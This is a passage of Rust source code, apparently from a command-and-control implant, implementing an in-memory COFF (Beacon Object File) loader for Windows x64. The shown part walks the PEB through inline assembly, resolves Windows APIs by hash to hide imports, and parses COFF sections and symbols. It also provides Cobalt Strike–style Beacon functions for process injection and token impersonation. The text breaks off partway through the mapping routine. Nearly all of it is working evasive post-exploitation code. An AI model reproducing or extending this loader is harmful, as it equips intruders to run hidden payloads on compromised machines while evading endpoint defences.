use std::arch::asm;
use std::ffi::{CString, c_void};
use std::ptr::{copy, copy_nonoverlapping, null_mut};
use std::sync::Mutex;

use base64::Engine;
use base64::engine::general_purpose::STANDARD;
use serde_json::json;
use zeroize::Zeroize;

use crate::commands::optional_string;
use crate::errors::{HostError, Result};

pub const NAME: &str = "coffexec";

const IMAGE_FILE_MACHINE_AMD64: u16 = 0x8664;
const COFF_HEADER: usize = 20;
const SECTION_HEADER: usize = 40;
const SYMBOL_SIZE: usize = 18;
const RELOCATION_SIZE: usize = 10;

const IMAGE_SYM_UNDEFINED: i16 = 0;
const IMAGE_SYM_CLASS_EXTERNAL: u8 = 2;
const IMAGE_REL_AMD64_ADDR64: u16 = 1;
const IMAGE_REL_AMD64_ADDR32NB: u16 = 3;
const IMAGE_REL_AMD64_REL32: u16 = 4;
const IMAGE_REL_AMD64_REL32_1: u16 = 5;
const IMAGE_REL_AMD64_REL32_2: u16 = 6;
const IMAGE_REL_AMD64_REL32_3: u16 = 7;
const IMAGE_REL_AMD64_REL32_4: u16 = 8;
const IMAGE_REL_AMD64_REL32_5: u16 = 9;
const IMAGE_REL_AMD64_SECTION: u16 = 10;
const IMAGE_REL_AMD64_SECREL: u16 = 11;

const IMAGE_SCN_MEM_EXECUTE: u32 = 0x2000_0000;
const IMAGE_SCN_MEM_WRITE: u32 = 0x8000_0000;

const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const MEM_RELEASE: u32 = 0x8000;
const PAGE_READONLY: u32 = 0x02;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
const PAGE_SIZE: usize = 0x1000;
const THUNK_SIZE: usize = 16;

const H_KERNEL32_DLL: u32 = 0xc705800d;
const H_NTDLL_DLL: u32 = 0x1cde56f9;
const H_MSVCRT_DLL: u32 = 0x4f8a6992;

const H_LOADLIBRARYA: u32 = 0x53b2070f;
const H_GETPROCADDRESS: u32 = 0xf8f45725;
const H_VIRTUALALLOC: u32 = 0x03285501;
const H_VIRTUALFREE: u32 = 0x3a9acc72;
const H_VIRTUALPROTECT: u32 = 0x820621f3;
const H_FLUSHINSTRUCTIONCACHE: u32 = 0x0490286b;
const H_GETCURRENTPROCESS: u32 = 0x6dd8a845;
const H___C_SPECIFIC_HANDLER: u32 = 0x174c6982;

const H_BEACONDATAPARSE: u32 = 0xf399e2a0;
const H_BEACONDATAINT: u32 = 0x3b3b237a;
const H_BEACONDATASHORT: u32 = 0x1c1a2ee1;
const H_BEACONDATALENGTH: u32 = 0x9d43f5d1;
const H_BEACONDATAEXTRACT: u32 = 0xbbf350c2;
const H_BEACONFORMATALLOC: u32 = 0x9a7eb077;
const H_BEACONFORMATRESET: u32 = 0x7bfda659;
const H_BEACONFORMATFREE: u32 = 0xa44b95f4;
const H_BEACONFORMATAPPEND: u32 = 0xa92fffe2;
const H_BEACONFORMATPRINTF: u32 = 0x5ec34a75;
const H_BEACONFORMATTOSTRING: u32 = 0xcd760eee;
const H_BEACONFORMATINT: u32 = 0xf037f8b7;
const H_BEACONPRINTF: u32 = 0x0b760976;
const H_BEACONOUTPUT: u32 = 0xa5575830;
const H_BEACONUSETOKEN: u32 = 0xc7b994c5;
const H_BEACONREVERTTOKEN: u32 = 0x2bcccfdc;
const H_BEACONISADMIN: u32 = 0xd0c500b8;
const H_BEACONGETSPAWNTO: u32 = 0xaa1cca43;
const H_BEACONSPAWNTEMPORARYPROCESS: u32 = 0x285c0c78;
const H_BEACONINJECTPROCESS: u32 = 0x4e732f0d;
const H_BEACONINJECTTEMPORARYPROCESS: u32 = 0x9b151f24;
const H_BEACONCLEANUPPROCESS: u32 = 0x383c06bc;
const H_TOWIDECHAR: u32 = 0xa2af2403;

const H_MEMCPY: u32 = 0xa45cec64;
const H_MEMSET: u32 = 0xcb80cc06;
const H_MEMMOVE: u32 = 0x01081b8b;
const H_STRLEN: u32 = 0x58ba3d97;
const H_STRCMP: u32 = 0x9d367094;
const H_STRNCMP: u32 = 0x9de3c256;
const H_STRICMP: u32 = 0x00f33f5d;
const H_STRCPY: u32 = 0x926a3aa6;
const H_STRNCPY: u32 = 0xa2c986b8;
const H_STRCAT: u32 = 0x9940f7a4;
const H_SPRINTF: u32 = 0x70e2d349;
const H_SNPRINTF: u32 = 0x3fd5eb6f;
const H_MALLOC: u32 = 0x558c274d;
const H_CALLOC: u32 = 0x73e20203;
const H_FREE: u32 = 0x99b3eedb;
const H_REALLOC: u32 = 0xbf26b345;

type VirtualAllocFn = unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void;
type VirtualFreeFn = unsafe extern "system" fn(*mut c_void, usize, u32) -> i32;
type VirtualProtectFn = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
type FlushInstructionCacheFn = unsafe extern "system" fn(isize, *const c_void, usize) -> i32;
type GetCurrentProcessFn = unsafe extern "system" fn() -> isize;
type LoadLibraryAFn = unsafe extern "system" fn(*const u8) -> isize;
type GetProcAddressFn = unsafe extern "system" fn(isize, *const u8) -> *mut c_void;
type BofEntryFn = unsafe extern "C" fn(*mut u8, i32);

static OUTPUT: Mutex<Vec<u8>> = Mutex::new(Vec::new());

#[derive(Clone, Copy)]
struct Api {
    virtual_alloc: VirtualAllocFn,
    virtual_free: VirtualFreeFn,
    virtual_protect: VirtualProtectFn,
    flush_instruction_cache: FlushInstructionCacheFn,
    get_current_process: GetCurrentProcessFn,
    load_library_a: LoadLibraryAFn,
    get_proc_address: GetProcAddressFn,
    ntdll: *mut u8,
    msvcrt: *mut u8,
}

#[derive(Clone)]
struct Section {
    virtual_size: u32,
    raw_size: u32,
    raw_ptr: u32,
    reloc_ptr: u32,
    reloc_count: u16,
    characteristics: u32,
}

#[derive(Clone)]
struct Symbol {
    name: Vec<u8>,
    value: u32,
    section_number: i16,
    storage_class: u8,
    aux_count: u8,
}

struct External {
    symbol_index: usize,
    is_imp: bool,
    thunk_offset: usize,
    resolved: *mut c_void,
}

struct MappedImage {
    api: Api,
    base: *mut u8,
    size: usize,
}

impl Drop for MappedImage {
    fn drop(&mut self) {
        if !self.base.is_null() && self.size != 0 {
            unsafe {
                (self.api.virtual_free)(self.base.cast(), 0, MEM_RELEASE);
            }
        }
    }
}

fn coff_error(message: &str) -> HostError {
    HostError::CoffText(message.to_string())
}

fn decode_hex(input: &str) -> Result<Vec<u8>> {
    let clean: String = input.chars().filter(|c| !c.is_whitespace()).collect();
    if clean.len() % 2 != 0 {
        return Err(HostError::BadInput);
    }
    let mut out = Vec::with_capacity(clean.len() / 2);
    let bytes = clean.as_bytes();
    for idx in (0..bytes.len()).step_by(2) {
        let part = std::str::from_utf8(&bytes[idx..idx + 2]).map_err(|_| HostError::BadInput)?;
        out.push(u8::from_str_radix(part, 16).map_err(|_| HostError::BadInput)?);
    }
    Ok(out)
}

fn pack_i16(out: &mut Vec<u8>, value: i64) -> Result<()> {
    let value = i16::try_from(value).map_err(|_| HostError::BadInput)?;
    out.extend_from_slice(&value.to_le_bytes());
    Ok(())
}

fn pack_i32(out: &mut Vec<u8>, value: i64) -> Result<()> {
    let value = i32::try_from(value).map_err(|_| HostError::BadInput)?;
    out.extend_from_slice(&value.to_le_bytes());
    Ok(())
}

fn pack_bytes(out: &mut Vec<u8>, mut data: Vec<u8>, wide: bool) -> Result<()> {
    if wide {
        data.extend_from_slice(&[0, 0]);
    } else {
        data.push(0);
    }
    let len = u32::try_from(data.len()).map_err(|_| HostError::BadInput)?;
    out.extend_from_slice(&len.to_le_bytes());
    out.extend_from_slice(&data);
    Ok(())
}

fn pack_string(out: &mut Vec<u8>, value: &str, wide: bool) -> Result<()> {
    let data = if wide {
        value
            .encode_utf16()
            .flat_map(|c| c.to_le_bytes())
            .collect::<Vec<u8>>()
    } else {
        value.as_bytes().to_vec()
    };
    pack_bytes(out, data, wide)
}

fn pack_one(out: &mut Vec<u8>, kind: &str, value: &serde_json::Value) -> Result<()> {
    match kind.to_ascii_lowercase().as_str() {
        "i" | "int" | "int32" | "dword" => {
            let number = value.as_i64().ok_or(HostError::BadInput)?;
            pack_i32(out, number)
        }
        "s" | "short" | "int16" | "word" => {
            let number = value.as_i64().ok_or(HostError::BadInput)?;
            pack_i16(out, number)
        }
        "z" | "str" | "string" | "utf8" => {
            let text = value.as_str().ok_or(HostError::BadInput)?;
            pack_string(out, text, false)
        }
        "z_wide" | "wstr" | "wstring" | "wchar" | "wide" | "utf16" | "utf16le" => {
            let text = value.as_str().ok_or(HostError::BadInput)?;
            pack_string(out, text, true)
        }
        "b" | "bin" | "bytes" | "base64" => {
            let text = value.as_str().ok_or(HostError::BadInput)?;
            let data = if let Some(hex) = text.strip_prefix("hex:") {
                decode_hex(hex)?
            } else {
                STANDARD.decode(text)?
            };
            let len = u32::try_from(data.len()).map_err(|_| HostError::BadInput)?;
            out.extend_from_slice(&len.to_le_bytes());
            out.extend_from_slice(&data);
            Ok(())
        }
        _ => Err(HostError::BadInput),
    }
}

fn pack_spec(spec: &str, values: &[serde_json::Value]) -> Result<Vec<u8>> {
    let mut out = Vec::new();
    let kinds: Vec<String> = spec
        .chars()
        .map(|c| match c {
            'i' => "int".to_string(),
            's' => "short".to_string(),
            'z' => "str".to_string(),
            'Z' => "wstr".to_string(),
            _ => c.to_string(),
        })
        .collect();
    if kinds.len() != values.len() {
        return Err(HostError::BadInput);
    }
    for (kind, value) in kinds.iter().zip(values.iter()) {
        pack_one(&mut out, kind, value)?;
    }
    let mut prefixed = Vec::with_capacity(out.len() + 4);
    prefixed.extend_from_slice(&(out.len() as u32).to_le_bytes());
    prefixed.extend_from_slice(&out);
    Ok(prefixed)
}

fn pack_typed(values: &[serde_json::Value]) -> Result<Vec<u8>> {
    let mut out = Vec::new();
    for item in values {
        let kind = item
            .get("type")
            .or_else(|| item.get("t"))
            .and_then(|v| v.as_str())
            .ok_or(HostError::BadInput)?;
        let value = item
            .get("value")
            .or_else(|| item.get("v"))
            .ok_or(HostError::BadInput)?;
        pack_one(&mut out, kind, value)?;
    }
    let mut prefixed = Vec::with_capacity(out.len() + 4);
    prefixed.extend_from_slice(&(out.len() as u32).to_le_bytes());
    prefixed.extend_from_slice(&out);
    Ok(prefixed)
}

fn packed_args(args: &serde_json::Value) -> Result<Vec<u8>> {
    if let Some(data) = optional_string(args, "args_b64") {
        return Ok(STANDARD.decode(data)?);
    }
    if let Some(data) = optional_string(args, "args_hex") {
        return decode_hex(data);
    }
    let values = args
        .get("arg_values")
        .or_else(|| args.get("values"))
        .and_then(|v| v.as_array());
    if let Some(spec) = optional_string(args, "arg_spec").or_else(|| optional_string(args, "pack")) {
        return pack_spec(spec, values.ok_or(HostError::BadInput)?);
    }
    if let Some(items) = args.get("typed_args").or_else(|| args.get("args")).and_then(|v| v.as_array()) {
        return pack_typed(items);
    }
    Ok(Vec::new())
}

fn read_u16(data: &[u8], offset: usize) -> Result<u16> {
    let end = offset.checked_add(2).ok_or(HostError::BadInput)?;
    let bytes = data.get(offset..end).ok_or(HostError::BadInput)?;
    Ok(u16::from_le_bytes([bytes[0], bytes[1]]))
}

fn read_i16(data: &[u8], offset: usize) -> Result<i16> {
    Ok(read_u16(data, offset)? as i16)
}

fn read_u32(data: &[u8], offset: usize) -> Result<u32> {
    let end = offset.checked_add(4).ok_or(HostError::BadInput)?;
    let bytes = data.get(offset..end).ok_or(HostError::BadInput)?;
    Ok(u32::from_le_bytes([bytes[0], bytes[1], bytes[2], bytes[3]]))
}

fn parse_c_string(data: &[u8], offset: usize) -> Result<Vec<u8>> {
    if offset >= data.len() {
        return Err(HostError::BadInput);
    }
    let tail = &data[offset..];
    let len = tail.iter().position(|b| *b == 0).unwrap_or(tail.len());
    Ok(tail[..len].to_vec())
}

fn parse_short_name(raw: &[u8]) -> Vec<u8> {
    let len = raw.iter().position(|b| *b == 0).unwrap_or(raw.len());
    raw[..len].to_vec()
}

fn checked_end(offset: usize, size: usize, limit: usize) -> Result<usize> {
    let end = offset.checked_add(size).ok_or(HostError::BadInput)?;
    if end > limit {
        return Err(HostError::BadInput);
    }
    Ok(end)
}

fn align_up(value: usize, alignment: usize) -> Result<usize> {
    value
        .checked_add(alignment - 1)
        .map(|v| v & !(alignment - 1))
        .ok_or(HostError::BadInput)
}

fn parse_coff(data: &[u8]) -> Result<(Vec<Section>, Vec<Symbol>)> {
    if data.len() < COFF_HEADER || read_u16(data, 0)? != IMAGE_FILE_MACHINE_AMD64 {
        return Err(HostError::BadInput);
    }

    let section_count = read_u16(data, 2)? as usize;
    let symbol_offset = read_u32(data, 8)? as usize;
    let symbol_count = read_u32(data, 12)? as usize;
    let optional_header = read_u16(data, 16)? as usize;
    if section_count == 0 || section_count > 96 || symbol_count > 131_072 {
        return Err(HostError::BadInput);
    }

    let section_table = COFF_HEADER
        .checked_add(optional_header)
        .ok_or(HostError::BadInput)?;
    let section_table_end = checked_end(
        section_table,
        section_count.checked_mul(SECTION_HEADER).ok_or(HostError::BadInput)?,
        data.len(),
    )?;
    if symbol_offset < section_table_end {
        return Err(HostError::BadInput);
    }

    let symbol_table_end = checked_end(
        symbol_offset,
        symbol_count.checked_mul(SYMBOL_SIZE).ok_or(HostError::BadInput)?,
        data.len(),
    )?;
    checked_end(symbol_table_end, 4, data.len())?;
    let string_table_size = read_u32(data, symbol_table_end)? as usize;
    if string_table_size < 4 {
        return Err(HostError::BadInput);
    }
    let file_end = checked_end(symbol_table_end, string_table_size, data.len())?;
    if file_end != data.len() {
        return Err(HostError::BadInput);
    }
    let string_table = &data[symbol_table_end..file_end];

    let mut sections = Vec::with_capacity(section_count);
    for idx in 0..section_count {
        let off = section_table + idx * SECTION_HEADER;
        let raw_size = read_u32(data, off + 16)?;
        let raw_ptr = read_u32(data, off + 20)?;
        let reloc_ptr = read_u32(data, off + 24)?;
        let reloc_count = read_u16(data, off + 32)?;
        if raw_size != 0 {
            checked_end(raw_ptr as usize, raw_size as usize, data.len())?;
        }
        if reloc_count != 0 {
            checked_end(
                reloc_ptr as usize,
                reloc_count as usize * RELOCATION_SIZE,
                data.len(),
            )?;
        }
        sections.push(Section {
            virtual_size: read_u32(data, off + 8)?,
            raw_size,
            raw_ptr,
            reloc_ptr,
            reloc_count,
            characteristics: read_u32(data, off + 36)?,
        });
    }

    let mut symbols = Vec::with_capacity(symbol_count);
    let mut idx = 0usize;
    while idx < symbol_count {
        let off = symbol_offset + idx * SYMBOL_SIZE;
        let name_raw = data.get(off..off + 8).ok_or(HostError::BadInput)?;
        let name = if read_u32(data, off)? == 0 {
            let string_offset = read_u32(data, off + 4)? as usize;
            parse_c_string(string_table, string_offset)?
        } else {
            parse_short_name(name_raw)
        };
        let aux_count = data[off + 17];
        symbols.push(Symbol {
            name,
            value: read_u32(data, off + 8)?,
            section_number: read_i16(data, off + 12)?,
            storage_class: data[off + 16],
            aux_count,
        });
        for _ in 0..aux_count {
            symbols.push(Symbol {
                name: Vec::new(),
                value: 0,
                section_number: 0,
                storage_class: 0,
                aux_count: 0,
            });
        }
        idx = idx
            .checked_add(1 + aux_count as usize)
            .ok_or(HostError::BadInput)?;
    }

    Ok((sections, symbols))
}

fn fnv1a(bytes: &[u8]) -> u32 {
    let mut hash = 0x811c9dc5u32;
    for byte in bytes {
        hash ^= *byte as u32;
        hash = hash.wrapping_mul(0x01000193);
    }
    hash
}

fn fnv1a_wide_lower_ascii(bytes: &[u8]) -> u32 {
    let mut hash = 0x811c9dc5u32;
    for byte in bytes {
        let b = if byte.is_ascii_uppercase() {
            byte + 32
        } else {
            *byte
        };
        hash ^= b as u32;
        hash = hash.wrapping_mul(0x01000193);
        hash ^= 0;
        hash = hash.wrapping_mul(0x01000193);
    }
    hash
}

unsafe fn peb() -> *const u8 {
    let out: *const u8;
    unsafe {
        asm!("mov {}, gs:[0x60]", out(reg) out);
    }
    out
}

unsafe fn find_module(module_hash: u32) -> *mut u8 {
    let peb = unsafe { peb() };
    if peb.is_null() {
        return null_mut();
    }
    let ldr = unsafe { *(peb.add(0x18) as *const *const u8) };
    if ldr.is_null() {
        return null_mut();
    }
    let list = unsafe { ldr.add(0x20) };
    let mut current = unsafe { *(list as *const *const u8) };
    while !current.is_null() && current != list {
        let entry = unsafe { current.sub(0x10) };
        let dll_base = unsafe { *(entry.add(0x30) as *const *mut u8) };
        let base_name_len = unsafe { *(entry.add(0x58) as *const u16) } as usize / 2;
        let base_name = unsafe { *(entry.add(0x60) as *const *const u16) };
        if !base_name.is_null() && base_name_len != 0 {
            let mut hash = 0x811c9dc5u32;
            for idx in 0..base_name_len {
                let mut ch = unsafe { *base_name.add(idx) };
                if (b'A' as u16..=b'Z' as u16).contains(&ch) {
                    ch += 32;
                }
                hash ^= (ch & 0xff) as u32;
                hash = hash.wrapping_mul(0x01000193);
                hash ^= ((ch >> 8) & 0xff) as u32;
                hash = hash.wrapping_mul(0x01000193);
            }
            if hash == module_hash {
                return dll_base;
            }
        }
        current = unsafe { *(current as *const *const u8) };
    }
    null_mut()
}

fn module_hash_from_ascii(module: &[u8]) -> u32 {
    let mut name = Vec::with_capacity(module.len() + 4);
    name.extend_from_slice(module);
    if !module.iter().any(|b| *b == b'.') {
        name.extend_from_slice(b".dll");
    }
    fnv1a_wide_lower_ascii(&name)
}

unsafe fn resolve_export_hash(
    module: *mut u8,
    function_hash: u32,
    loader: Option<LoadLibraryAFn>,
) -> *mut c_void {
    if module.is_null() {
        return null_mut();
    }

    let dos_magic = unsafe { *(module as *const u16) };
    if dos_magic != 0x5a4d {
        return null_mut();
    }
    let e_lfanew = unsafe { *(module.add(0x3c) as *const i32) };
    if e_lfanew <= 0 {
        return null_mut();
    }
    let nt = unsafe { module.add(e_lfanew as usize) };
    let signature = unsafe { *(nt as *const u32) };
    if signature != 0x0000_4550 {
        return null_mut();
    }
    let export_rva = unsafe { *(nt.add(0x88) as *const u32) };
    let export_size = unsafe { *(nt.add(0x8c) as *const u32) };
    if export_rva == 0 || export_size == 0 {
        return null_mut();
    }
    let export_dir = unsafe { module.add(export_rva as usize) };
    let number_of_names = unsafe { *(export_dir.add(24) as *const u32) };
    let address_of_functions = unsafe { *(export_dir.add(28) as *const u32) };
    let address_of_names = unsafe { *(export_dir.add(32) as *const u32) };
    let address_of_ordinals = unsafe { *(export_dir.add(36) as *const u32) };

    for idx in 0..number_of_names {
        let name_rva = unsafe { *(module.add(address_of_names as usize + idx as usize * 4) as *const u32) };
        let name_ptr = unsafe { module.add(name_rva as usize) };
        let name = unsafe { cstr_bytes(name_ptr) };
        if fnv1a(name) != function_hash {
            continue;
        }
        let ordinal = unsafe {
            *(module.add(address_of_ordinals as usize + idx as usize * 2) as *const u16)
        } as usize;
        let function_rva = unsafe {
            *(module.add(address_of_functions as usize + ordinal * 4) as *const u32)
        };
        if function_rva >= export_rva && function_rva < export_rva.saturating_add(export_size) {
            let forwarder = unsafe { cstr_bytes(module.add(function_rva as usize)) };
            if let Some(dot) = forwarder.iter().position(|b| *b == b'.') {
                let dll = &forwarder[..dot];
                let func = &forwarder[dot + 1..];
                if func.first() == Some(&b'#') {
                    return null_mut();
                }
                let target_hash = module_hash_from_ascii(dll);
                let mut target_module = unsafe { find_module(target_hash) };
                if target_module.is_null() {
                    if let Some(load_library_a) = loader {
                        let mut dll_name = Vec::with_capacity(dll.len() + 5);
                        dll_name.extend_from_slice(dll);
                        if !dll.iter().any(|b| *b == b'.') {
                            dll_name.extend_from_slice(b".dll");
                        }
                        dll_name.push(0);
                        target_module = unsafe { load_library_a(dll_name.as_ptr()) as *mut u8 };
                    }
                }
                if !target_module.is_null() {
                    return unsafe { resolve_export_hash(target_module, fnv1a(func), loader) };
                }
            }
            return null_mut();
        }
        return unsafe { module.add(function_rva as usize).cast() };
    }
    null_mut()
}

unsafe fn cstr_bytes<'a>(ptr: *const u8) -> &'a [u8] {
    if ptr.is_null() {
        return &[];
    }
    let mut len = 0usize;
    while len < 0x10000 && unsafe { *ptr.add(len) } != 0 {
        len += 1;
    }
    unsafe { std::slice::from_raw_parts(ptr, len) }
}

unsafe fn cstr_lossy(ptr: *const u8) -> String {
    String::from_utf8_lossy(unsafe { cstr_bytes(ptr) }).to_string()
}

unsafe fn wide_lossy(ptr: *const u16) -> String {
    if ptr.is_null() {
        return String::new();
    }
    let mut len = 0usize;
    while len < 0x8000 && unsafe { *ptr.add(len) } != 0 {
        len += 1;
    }
    let slice = unsafe { std::slice::from_raw_parts(ptr, len) };
    String::from_utf16_lossy(slice)
}

impl Api {
    unsafe fn resolve() -> Result<Self> {
        let kernel32 = unsafe { find_module(H_KERNEL32_DLL) };
        if kernel32.is_null() {
            return Err(coff_error("resolver"));
        }
        let load_library_a_ptr = unsafe { resolve_export_hash(kernel32, H_LOADLIBRARYA, None) };
        if load_library_a_ptr.is_null() {
            return Err(coff_error("resolver"));
        }
        let load_library_a: LoadLibraryAFn = unsafe { std::mem::transmute(load_library_a_ptr) };
        let get_proc_address_ptr = unsafe { resolve_export_hash(kernel32, H_GETPROCADDRESS, Some(load_library_a)) };
        let virtual_alloc_ptr = unsafe { resolve_export_hash(kernel32, H_VIRTUALALLOC, Some(load_library_a)) };
        let virtual_free_ptr = unsafe { resolve_export_hash(kernel32, H_VIRTUALFREE, Some(load_library_a)) };
        let virtual_protect_ptr = unsafe { resolve_export_hash(kernel32, H_VIRTUALPROTECT, Some(load_library_a)) };
        let flush_instruction_cache_ptr = unsafe { resolve_export_hash(kernel32, H_FLUSHINSTRUCTIONCACHE, Some(load_library_a)) };
        let get_current_process_ptr = unsafe { resolve_export_hash(kernel32, H_GETCURRENTPROCESS, Some(load_library_a)) };
        if get_proc_address_ptr.is_null()
            || virtual_alloc_ptr.is_null()
            || virtual_free_ptr.is_null()
            || virtual_protect_ptr.is_null()
            || flush_instruction_cache_ptr.is_null()
            || get_current_process_ptr.is_null()
        {
            return Err(coff_error("resolver"));
        }
        let get_proc_address: GetProcAddressFn = unsafe { std::mem::transmute(get_proc_address_ptr) };
        let virtual_alloc: VirtualAllocFn = unsafe { std::mem::transmute(virtual_alloc_ptr) };
        let virtual_free: VirtualFreeFn = unsafe { std::mem::transmute(virtual_free_ptr) };
        let virtual_protect: VirtualProtectFn = unsafe { std::mem::transmute(virtual_protect_ptr) };
        let flush_instruction_cache: FlushInstructionCacheFn = unsafe { std::mem::transmute(flush_instruction_cache_ptr) };
        let get_current_process: GetCurrentProcessFn = unsafe { std::mem::transmute(get_current_process_ptr) };
        let mut msvcrt = unsafe { find_module(H_MSVCRT_DLL) };
        if msvcrt.is_null() {
            msvcrt = unsafe { load_library_a(b"msvcrt.dll\0".as_ptr()) as *mut u8 };
        }
        Ok(Self {
            virtual_alloc,
            virtual_free,
            virtual_protect,
            flush_instruction_cache,
            get_current_process,
            load_library_a,
            get_proc_address,
            ntdll: unsafe { find_module(H_NTDLL_DLL) },
            msvcrt,
        })
    }

    unsafe fn resolve_dfr(&self, symbol: &[u8]) -> Option<*mut c_void> {
        let stripped = strip_imp(symbol);
        let split = stripped.iter().position(|b| *b == b'$')?;
        let dll = &stripped[..split];
        let mut func = &stripped[split + 1..];
        if let Some(at) = func.iter().position(|b| *b == b'@') {
            func = &func[..at];
        }
        if dll.is_empty() || func.is_empty() {
            return None;
        }
        let mut dll_name = Vec::with_capacity(dll.len() + 5);
        dll_name.extend_from_slice(dll);
        if !dll.iter().any(|b| *b == b'.') {
            dll_name.extend_from_slice(b".dll");
        }
        dll_name.push(0);
        let hmod = unsafe { (self.load_library_a)(dll_name.as_ptr()) };
        if hmod == 0 {
            return None;
        }
        let mut func_name = Vec::with_capacity(func.len() + 1);
        func_name.extend_from_slice(func);
        func_name.push(0);
        let ptr = unsafe { (self.get_proc_address)(hmod, func_name.as_ptr()) };
        if ptr.is_null() { None } else { Some(ptr) }
    }
}

fn strip_imp(name: &[u8]) -> &[u8] {
    name.strip_prefix(b"__imp_").unwrap_or(name)
}

fn is_imp_symbol(name: &[u8]) -> bool {
    name.starts_with(b"__imp_")
}

macro_rules! fn_addr {
    ($name:path) => {
        $name as *const () as usize
    };
}

fn internal_symbol(api: &Api, name: &[u8]) -> Option<*mut c_void> {
    let stripped = strip_imp(name);
    let hash = fnv1a(stripped);
    let ptr = match hash {
        H_BEACONDATAPARSE => fn_addr!(beacon_data_parse),
        H_BEACONDATAINT => fn_addr!(beacon_data_int),
        H_BEACONDATASHORT => fn_addr!(beacon_data_short),
        H_BEACONDATALENGTH => fn_addr!(beacon_data_length),
        H_BEACONDATAEXTRACT => fn_addr!(beacon_data_extract),
        H_BEACONFORMATALLOC => fn_addr!(beacon_format_alloc),
        H_BEACONFORMATRESET => fn_addr!(beacon_format_reset),
        H_BEACONFORMATFREE => fn_addr!(beacon_format_free),
        H_BEACONFORMATAPPEND => fn_addr!(beacon_format_append),
        H_BEACONFORMATPRINTF => fn_addr!(beacon_format_printf),
        H_BEACONFORMATTOSTRING => fn_addr!(beacon_format_to_string),
        H_BEACONFORMATINT => fn_addr!(beacon_format_int),
        H_BEACONPRINTF => fn_addr!(beacon_printf),
        H_BEACONOUTPUT => fn_addr!(beacon_output),
        H_BEACONUSETOKEN => fn_addr!(beacon_use_token),
        H_BEACONREVERTTOKEN => fn_addr!(beacon_revert_token),
        H_BEACONISADMIN => fn_addr!(beacon_is_admin),
        H_BEACONGETSPAWNTO => fn_addr!(beacon_get_spawn_to),
        H_BEACONSPAWNTEMPORARYPROCESS => fn_addr!(beacon_spawn_temporary_process),
        H_BEACONINJECTPROCESS => fn_addr!(beacon_inject_process),
        H_BEACONINJECTTEMPORARYPROCESS => fn_addr!(beacon_inject_temporary_process),
        H_BEACONCLEANUPPROCESS => fn_addr!(beacon_cleanup_process),
        H_TOWIDECHAR => fn_addr!(to_wide_char),
        H_MEMCPY => fn_addr!(compat_memcpy),
        H_MEMSET => fn_addr!(compat_memset),
        H_MEMMOVE => fn_addr!(compat_memmove),
        H_STRLEN => fn_addr!(compat_strlen),
        H_STRCMP => fn_addr!(compat_strcmp),
        H_STRNCMP => fn_addr!(compat_strncmp),
        H_STRICMP => fn_addr!(compat_stricmp),
        H_STRCPY => fn_addr!(compat_strcpy),
        H_STRNCPY => fn_addr!(compat_strncpy),
        H_STRCAT => fn_addr!(compat_strcat),
        H_SPRINTF => fn_addr!(compat_sprintf),
        H_SNPRINTF => fn_addr!(compat_snprintf),
        H_MALLOC => fn_addr!(compat_malloc),
        H_CALLOC => fn_addr!(compat_calloc),
        H_FREE => fn_addr!(compat_free),
        H_REALLOC => fn_addr!(compat_realloc),
        H_LOADLIBRARYA => api.load_library_a as usize,
        H_GETPROCADDRESS => api.get_proc_address as usize,
        H_VIRTUALALLOC => api.virtual_alloc as usize,
        H_VIRTUALFREE => api.virtual_free as usize,
        H_VIRTUALPROTECT => api.virtual_protect as usize,
        H_FLUSHINSTRUCTIONCACHE => api.flush_instruction_cache as usize,
        H_GETCURRENTPROCESS => api.get_current_process as usize,
        H___C_SPECIFIC_HANDLER => unsafe {
            resolve_export_hash(api.ntdll, H___C_SPECIFIC_HANDLER, Some(api.load_library_a)) as usize
        },
        _ => 0,
    };
    if ptr == 0 { None } else { Some(ptr as *mut c_void) }
}

fn resolve_external(api: &Api, name: &[u8]) -> Option<*mut c_void> {
    if let Some(ptr) = internal_symbol(api, name) {
        return Some(ptr);
    }
    if name.iter().any(|b| *b == b'$') {
        return unsafe { api.resolve_dfr(name) };
    }
    if !api.msvcrt.is_null() {
        let hash = fnv1a(strip_imp(name));
        let ptr = unsafe { resolve_export_hash(api.msvcrt, hash, Some(api.load_library_a)) };
        if !ptr.is_null() {
            return Some(ptr);
        }
    }
    None
}

fn output_clear() {
    if let Ok(mut out) = OUTPUT.lock() {
        out.clear();
    }
}

fn output_take() -> String {
    if let Ok(mut out) = OUTPUT.lock() {
        let text = String::from_utf8_lossy(&out).to_string();
        out.zeroize();
        out.clear();
        text
    } else {
        String::new()
    }
}

fn output_append(data: &[u8]) {
    if let Ok(mut out) = OUTPUT.lock() {
        let remaining = 2usize.saturating_mul(1024).saturating_mul(1024).saturating_sub(out.len());
        let take = remaining.min(data.len());
        if take != 0 {
            out.extend_from_slice(&data[..take]);
        }
    }
}

unsafe fn write_thunk(ptr: *mut u8, target: *mut c_void) {
    unsafe {
        *ptr.add(0) = 0xff;
        *ptr.add(1) = 0x25;
        *ptr.add(2) = 0;
        *ptr.add(3) = 0;
        *ptr.add(4) = 0;
        *ptr.add(5) = 0;
        *(ptr.add(6) as *mut u64) = target as u64;
        for idx in 14..THUNK_SIZE {
            *ptr.add(idx) = 0x90;
        }
    }
}

fn map_and_execute(coff: &[u8], args: &mut [u8], entry_name: &[u8]) -> Result<i32> {
    let api = unsafe { Api::resolve()? };
    let (sections, symbols) = parse_coff(coff)?;

    let mut section_offsets = Vec::with_capacity(sections.len());
    let mut section_sizes = Vec::with_capacity(sections.len());
    let mut total_sections = 0usize;
    for section in &sections {
        let sec_size = (section.raw_size as usize).max(section.virtual_size as usize);
        section_offsets.push(total_sections);
        section_sizes.push(sec_size);
        if sec_size != 0 {
            total_sections = total_sections
                .checked_add(align_up(sec_size, PAGE_SIZE)?)
                .ok_or(HostError::BadInput)?;
        }
    }

    let mut externals = Vec::new();
    let mut idx = 0usize;
    while idx < symbols.len() {
        let sym = &symbols[idx];
        if sym.section_number == IMAGE_SYM_UNDEFINED
            && sym.storage_class == IMAGE_SYM_CLASS_EXTERNAL
            && sym.value == 0
            && !sym.name.is_empty()
        {
            let resolved = resolve_external(&api, &sym.name)
                .ok_or_else(|| coff_error(&format!("unresolved:{}", String::from_utf8_lossy(&sym.name))))?;
            externals.push(External {
                symbol_index: idx,
                is_imp: is_imp_symbol(&sym.name),
                thunk_offset: 0,
                resolved,
            });
        }
